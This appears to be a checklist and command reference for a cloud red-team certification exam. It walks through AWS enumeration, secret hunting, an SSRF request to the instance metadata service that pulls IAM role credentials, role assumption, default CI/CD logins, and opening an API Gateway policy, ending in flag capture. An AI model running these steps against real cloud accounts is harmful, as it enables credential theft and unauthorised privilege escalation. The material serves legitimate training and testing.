

# 🛡️ ACRTP Exam Full Checklist & Command Reference

## 0. Setup & Preparation
- ✅ Configure AWS CLI with provided credentials:
  ```bash
  aws configure --profile exam
  export AWS_PROFILE=exam
  ```
- ✅ Validate identity:
  ```bash
  aws sts get-caller-identity
  ```

## 1. Initial Recon & Enumeration
- ✅ Run `cloudfox` situational awareness (if Linux box available):
  ```bash
  cloudfox all -p exam -o recon-results
  ```

### IAM Enumeration
- ✅ Enumerate users and roles:
  ```bash
  aws iam list-users
  aws iam list-roles
  ```
- ✅ Check caller identity permissions:
  ```bash
  aws iam simulate-principal-policy --policy-source-arn arn:aws:iam::<ACCOUNT>:user/<USER> --action-names '*' --output json
  ```

### S3 Enumeration
- ✅ List buckets:
  ```bash
  aws s3 ls
  ```
- ✅ List contents of accessible buckets:
  ```bash
  aws s3 ls s3://bucket-name --recursive
  aws s3 cp s3://bucket-name/target_file.txt .
  ```

### EBS Snapshot Hunting
- ✅ Search for public snapshots:
  ```bash
  aws ec2 describe-snapshots --owner-ids self --query 'Snapshots[?Encrypted==`false`]' --output table
  ```

## 2. Credentials & Secrets Hunting
- ✅ Search S3, Git, Lambda, and EC2 for secrets:
  ```bash
  trufflehog gitfile
  grep -r "AKIA" .
  aws lambda list-functions
  aws lambda get-function --function-name <name>
  ```

- ✅ If Git repo exposed:
  ```bash
  git clone <URL>
  git log -p | grep -i key
  ```

## 3. SSRF and Metadata Service
- ✅ Exploit SSRF to get metadata:
  ```
  curl http://169.254.169.254/latest/meta-data/
  curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>
  ```

- ✅ Export temp creds:
  ```bash
  export AWS_ACCESS_KEY_ID=<>
  export AWS_SECRET_ACCESS_KEY=<>
  export AWS_SESSION_TOKEN=<>
  ```

## 4. Assume Role / Privilege Escalation
- ✅ Check for trust policies:
  ```bash
  aws iam get-role --role-name <role>
  ```

- ✅ Assume role:
  ```bash
  aws sts assume-role --role-arn arn:aws:iam::<ACCOUNT>:role/<ROLE> --role-session-name examSession
  ```

## 5. CI/CD Exploitation
- ✅ Jenkins:
  - Check `/script` and credential leaks
- ✅ TeamCity:
  - Default creds: admin/admin or guest access
  - Check build logs for AWS secrets

## 6. API Gateway Enumeration
- ✅ List and test API endpoints:
  ```bash
  aws apigateway get-rest-apis
  curl -X GET https://<api>.execute-api.<region>.amazonaws.com/stage/path
  ```

- ✅ Patch policy to open up:
  ```bash
  aws apigateway update-rest-api --rest-api-id <id>   --patch-operations '[{"op":"replace","path":"/policy","value":"..."}]'
  ```

## 7. Detection & Logging
- ✅ Use Athena + CloudTrail:
  ```sql
  SELECT * FROM cloudtrail_logs WHERE eventName = 'AssumeRole';
  ```

- ✅ Splunk:
  - Search for credential use, assume-role events

## 8. Honey Token / Monitoring
- ✅ Monitor AWS Config, GuardDuty, Access Analyzer
- ✅ Honey Token IAM user detected? Track actions and exfil

## 9. Find the Flag
- ✅ Look in S3, user data, EC2 scripts, environment variables
- ✅ Flag format: `FLAG-{...}`

## 10. Submission
- ✅ Submit flag to exam portal

## 🧠 Pro Tips
- jq prettifies responses:
  ```bash
  aws iam get-role --role-name <role> | jq
  ```
- Always specify `--profile` or use `export AWS_PROFILE=exam`

 